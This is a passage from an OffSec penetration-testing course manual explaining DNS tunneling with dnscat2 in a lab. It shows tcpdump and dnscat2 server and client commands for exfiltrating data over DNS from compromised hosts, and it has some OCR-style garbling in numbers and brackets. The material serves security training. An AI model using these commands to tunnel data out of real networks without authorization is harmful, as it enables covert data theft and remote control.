# OffSec

In this section, we discussed how to infiltrate or exfiltrate data through various types of DNS records. In the next section we will get hands-on experience with the dnscat259 framework, which leverages these techniques to create a multipurpose DNS tunnel.

# 19.2.2 DNS Tunneling with dnscat2

We can use dnscat2960 to exfiltrate data with DNS subdomain queries and infiltrate data with TXT (and other records).

A dnscat2 server runs on an authoritative name server for a particular domain, and clients (which are configured to make queries to that domain) run on compromised machines.

Let's try dnscat2. We will inspect traffic from FELINEAUTHORITY with tcpdump, filtering specifically on UDP port 53 (udp port 53).

```
kali@felineauthority:~$ sudo tcpdump -i ens192 udp port 53
[sudo] password for kali:
tcpdump: verbose output suppressed, use -v]... for full protocol decode
listening on ens192, link-type1(Ethernet), snapshot 262144
```

Listing 608 - Starting tcpdump for packets on UDP port 53

We'll kill our dnsmap process with a -C and run dnscat2-server instead, the feline.corp domain as the only argument.

kali@felineauthority:~$ dnscat2-server feline.corp

```
New window created: 0
New window created: crypto-debug
Welcome to dnscat2 Some documentation may be out of date.
```

```
auto_attach => false
history_size (for new windows) => 1000
Security policy: all connections must be encrypted
New window created: dns1
Starting dnscat2 DNS server on 0.0.0.0:53
[domains = feline.corp)...
```

Assuming you have an authoritative DNS server, you can run the client with the following (--secret is optional):

```
./dnscat2 --secret=c6cbfa40606776fb86bf439e5eb5b8e7 feline
```

To direct to the server without a domain name, run:

```
./dnscat2 --dns server=x.x.x.x,port=53 --secret=c6cbfa40606776fb86bf439e5eb5b8e7
```

Of course, you will have to figure out <server> yourself! Clients will connect directly on UDP port 53.

```
dnscat2>
```

Listing 609 - Starting the dnscat2 server.

599 (Ron Bowes, 2022), https://github.com/iag86/dnscat2
960 (Ron Bowes, 2022), https://github.com/iag86/dnscat2

PWK - Copyright © 2023 OffSec Services Limited. All rights reserved.